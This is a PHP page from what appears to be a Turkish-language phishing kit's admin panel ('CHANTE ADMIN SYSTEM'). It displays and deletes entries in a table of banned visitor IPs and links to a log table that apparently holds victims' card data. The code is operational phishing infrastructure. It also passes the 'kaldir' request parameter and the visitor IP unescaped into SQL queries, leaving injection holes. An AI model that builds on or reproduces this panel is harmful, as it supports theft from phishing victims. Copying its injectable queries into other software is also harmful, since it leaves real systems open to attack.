<?php 

date_default_timezone_set('Europe/Istanbul');
include("../mysql.php");
include("core/getRealIPAdress.php");
session_start();
$mysqli = $_SESSION['mysqli'];
$ip = getUserIP();

$logSQL = mysqli_query($mysqli, "SELECT * FROM sazan");
$logSayisi = mysqli_num_rows($logSQL);
   
$banSQL = mysqli_query($mysqli, "SELECT * FROM ban");
$banSayisi = mysqli_num_rows($banSQL);

mysqli_query($mysqli, "UPDATE paneldekiler SET durum = 'Ban Tablosu' WHERE ip = '{$ip}'");
if(!isset($_SESSION["login"])){
  mysqli_query($mysqli, "DELETE FROM paneldekiler WHERE ip='$ip'");
  header('Location:login.php');
}else{
if(isset($_GET['kaldir'])){
  $ban = $_GET['kaldir'];
  mysqli_query($mysqli, "DELETE FROM ban WHERE ban='$ban'");
  echo "<script>window.location.href='bantablosu.php';</script>";
}
if(isset($_GET['logout'])){
  session_start();
  ob_start();
  session_unset();
  session_destroy();
  mysqli_query($mysqli, "DELETE FROM paneldekiler WHERE ip='$ip'");
  header('Location:login.php');
}

	
?>
<!doctype html>
<html lang="tr" dir="ltr">
  <head>
    <!-- META DATA -->
    <meta charset="UTF-8">
    <meta name='viewport' content='width=device-width, initial-scale=1.0, user-scalable=0'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="CHANTE ADMIN SYSTEM">
    <meta name="author" content="Chante">
    <meta name="keywords" content="phishing, script">
    <!-- TITLE -->
    <title>CHANTE ADMIN SYSTEM</title>
    <!-- BOOTSTRAP CSS -->
    <link id="style" href="assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
    <!-- STYLE CSS -->
    <link href="assets/css/style.css" rel="stylesheet" />
    <link href="assets/css/dark-style.css" rel="stylesheet" />
    <link href="assets/css/skin-modes.css" rel="stylesheet" />
    <!--- FONT-ICONS CSS -->
    <link href="assets/css/icons.css" rel="stylesheet" />
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" rel="stylesheet" />
    <!-- COLOR SKIN CSS -->
    <link id="theme" rel="stylesheet" type="text/css" media="all" href="assets/colors/color1.css" />
    <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
    <script>
    $(document).ready(function() {
        setInterval(function() {
            $("#tablo").load(window.location.href + " #tablo");
        }, 3000);
    }); 
    </script>
  </head>
  <body class="app sidebar-mini ltr dark-mode">
    <!-- PAGE -->
    <div class="page">
      <div class="page-main">
        <!-- app-Header -->
        <div class="app-header header sticky">
          <div class="container-fluid main-container">
            <div class="d-flex">
              <a aria-label="Hide Sidebar" class="app-sidebar__toggle" data-bs-toggle="sidebar" href=""></a>
                  <!-- sidebar-toggle-->
                  <a class="logo-horizontal">
                <img src="../assets/img/1.png" style="width: 150px;" class="header-brand-img desktop-logo" alt="logo">
                <img src="../assets/img/1.png" style="width: 150px;" class="header-brand-img light-logo1" alt="logo">
              </a>
              <!-- LOGO -->
              <div class="d-flex order-lg-2 ms-auto header-right-icons">
                <button class="navbar-toggler navresponsive-toggler d-lg-none ms-auto" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent-4" aria-controls="navbarSupportedContent-4" aria-expanded="false" aria-label="Toggle navigation">
                  <span class="navbar-toggler-icon fe fe-more-vertical"></span>
                </button>
                <div class="navbar navbar-collapse responsive-navbar p-0">
                  <div class="collapse navbar-collapse" id="navbarSupportedContent-4">
                    <div class="d-flex order-lg-2">
                      <div class="dropdown  d-flex">
                        <a class="nav-link icon theme-layout nav-link-bg layout-setting">
                          <span class="dark-layout">
                            <i class="fe fe-moon"></i>
                          </span>
                          <span class="light-layout">
                            <i class="fe fe-sun"></i>
                          </span>
                        </a>
                      </div>
                      <!-- Theme-Layout -->
                      <div class="dropdown d-flex">
                        <a class="nav-link icon full-screen-link nav-link-bg">
                          <i class="fe fe-minimize fullscreen-button"></i>
                        </a>
                      </div>
                      <!-- FULL-SCREEN -->
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <!-- /app-Header -->
        <!--APP-SIDEBAR-->
        <div class="sticky">
          <div class="app-sidebar__overlay" data-bs-toggle="sidebar"></div>
          <div class="app-sidebar">
            <div class="side-header">
              <a class="header-brand1">
                <img src="../assets/img/1.png" style="width: 150px;" class="header-brand-img desktop-logo" alt="logo">
                <img src="../assets/img/1.png" style="width: 150px;" class="header-brand-img light-logo" alt="logo">
                <img src="../assets/img/1.png" style="width: 150px;" class="header-brand-img light-logo1" alt="logo">
              </a>
              <!-- LOGO -->
            </div>
            <div class="main-sidemenu">
              <div class="slide-left disabled" id="slide-left">
                <svg xmlns="http://www.w3.org/2000/svg" fill="#7b8191" width="24" height="24" viewBox="0 0 24 24">
                  <path d="M13.293 6.293 7.586 12l5.707 5.707 1.414-1.414L10.414 12l4.293-4.293z" />
                </svg>
              </div>
              <ul class="side-menu">
                <li class="sub-category">
                  <h3>Panel</h3>
                </li>
                <li class="slide">
                  <a class="side-menu__item" data-bs-toggle="slide" href="index.php">
                    <i class="side-menu__icon fe fe-home"></i>
                    <span class="side-menu__label">Anasayfa</span>
                  </a>
                </li>
                <li class="sub-category">
                  <h3>PHISHING</h3>
                </li>
                <li class="slide">
                  <a class="side-menu__item" data-bs-toggle="slide" href="logtablosu.php">
                    <i class="side-menu__icon fa-brands fa-cc-visa"></i>
                    <span class="side-menu__label">Log Tablosu</span>
                  </a>
                  <a class="side-menu__item" data-bs-toggle="slide" href="bantablosu.php">
                    <i class="side-menu__icon fa-solid fa-ban"></i>
                    <span class="side-menu__label">Ban Tablosu</span>
                  </a>
                </li>
                <li class="sub-category">
                  <h3>Genel</h3>
                </li>
                <li class="slide">
                  <a class="side-menu__item" data-bs-toggle="slide" href="reklamtaramasi.php">
                    <i class="side-menu__icon fe fe-chrome"></i>
                    <span class="side-menu__label">Reklam Taraması</span>
                    <span class="badge bg-green side-badge">Yeni</span>
                  </a>
                  
                </li>
                <li class="sub-category">
                  <h3>Ayarlar</h3>
                </li>
                <li class="slide">
                  <a class="side-menu__item" data-bs-toggle="slide" href="panelayarlari.php">
                    <i class="side-menu__icon fe fe-settings"></i>
                    <span class="side-menu__label">Panel Ayarları</span>
                  </a>
                  <a class="side-menu__item" data-bs-toggle="slide" href="?logout">
                    <i class="side-menu__icon fe fe-log-out"></i>
                    <span class="side-menu__label">Çıkış Yap</span>
                  </a>
                </li>
              </ul>
              <div class="slide-right" id="slide-right">
                <svg xmlns="http://www.w3.org/2000/svg" fill="#7b8191" width="24" height="24" viewBox="0 0 24 24">
                  <path d="M10.707 17.707 16.414 12l-5.707-5.707-1.414 1.414L13.586 12l-4.293 4.293z" />
                </svg>
              </div>
            </div>
          </div>
          <!--/APP-SIDEBAR-->
        </div>
        <!--app-content open-->
        <div class="main-content app-content mt-0">
          <div class="side-app">
            <!-- CONTAINER -->
            <div class="main-container container-fluid">
              <!-- PAGE-HEADER -->
              <div class="page-header">
                <h1 class="page-title">Ban Tablosu</h1>
                <div>
                  <ol class="breadcrumb">
                    <li class="breadcrumb-item">
                      <a href="">Phishing</a>
                    </li>
                    <li class="breadcrumb-item active" aria-current="page">Ban Tablosu</li>
                  </ol>
                </div>
              </div>
              <!-- PAGE-HEADER END -->
              <!-- ROW-1 -->
              <div class="row">
                <div class="col-xl-12">
                  <div class="card">
                    <div class="card-body">
                      <div id="tablo" class="table-responsive">
                        <table class="table border text-nowrap text-md-nowrap table-borderless mb-0">
                          <thead>
                            <tr>
                              <th>IP ADRESI</th>
                              <th>KONUM</th>
                              <th>CIHAZ</th>
                              <th>TARAYICI</th>
                              <th>TARIH</th>
                              <th>ISLEM</th>
                            </tr>
                          </thead> <?php $sqla=mysqli_query($mysqli, 'SELECT * FROM ban'); ?>
                            <tbody> <?php foreach($sqla as $oku) { ?>
                              <tr>
                              <td><?php echo $oku['ban']; ?></td>
                              <td><?php echo $oku['ulke']; ?></td>
                              <td><?php echo $oku['cihaz']; ?></td>
                              <td><?php echo $oku['tarayici']; ?></td>
                              <td><?php echo $oku['date']; ?></td>
                              <td><span class="badge rounded-pill bg-danger-gradient badge-sm me-1 mb-1 mt-1"><a href="?kaldir=<?php echo $oku['ban']; ?>"><i style="color: white;" class="fa-solid fa-trash fa-lg"></i></a></span></td>
                              </tr> <?php } ?>
                          </tbody>
                        </table>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <!-- ROW-1 END -->
            </div>
            <!-- CONTAINER END -->
          </div>
        </div>
        <!--app-content close-->
      </div>
      <!-- FOOTER -->
      <footer class="footer">
        <div class="container">
          <div class="row align-items-center flex-row-reverse">
            <div class="col-md-12 col-sm-12 text-center"> Copyright © 2022 <a href="https://icq.im/Chante">Chante</a></div>
          </div>
        </div>
      </footer>
      <!-- FOOTER END -->
    </div>
    <!-- BACK-TO-TOP -->
    <a href="#top" id="back-to-top">
      <i class="fa fa-angle-up"></i>
    </a>
    <!-- JQUERY JS -->
    <script src="assets/js/jquery.min.js"></script>
    <!-- BOOTSTRAP JS -->
    <script src="assets/plugins/bootstrap/js/popper.min.js"></script>
    <script src="assets/plugins/bootstrap/js/bootstrap.min.js"></script>
    <!-- SIDEBAR JS -->
    <script src="assets/plugins/sidebar/sidebar.js"></script>
    <!-- SIDE-MENU JS-->
    <script src="assets/plugins/sidemenu/sidemenu.js"></script>
    <!-- INTERNAL INDEX JS -->
    <script src="assets/js/index1.js"></script>
     <!-- Perfect SCROLLBAR JS-->
    <script src="assets/plugins/p-scroll/perfect-scrollbar.js"></script>
    <script src="assets/plugins/p-scroll/pscroll.js"></script>
    <script src="assets/plugins/p-scroll/pscroll-1.js"></script>
    <!-- Color Theme js -->
    <script src="assets/js/themeColors.js"></script>
    <!-- Sticky js -->
    <script src="assets/js/sticky.js"></script>
    <!-- CUSTOM JS -->
    <script src="assets/js/custom.js"></script>
  </body>
</html>
<?php } ?>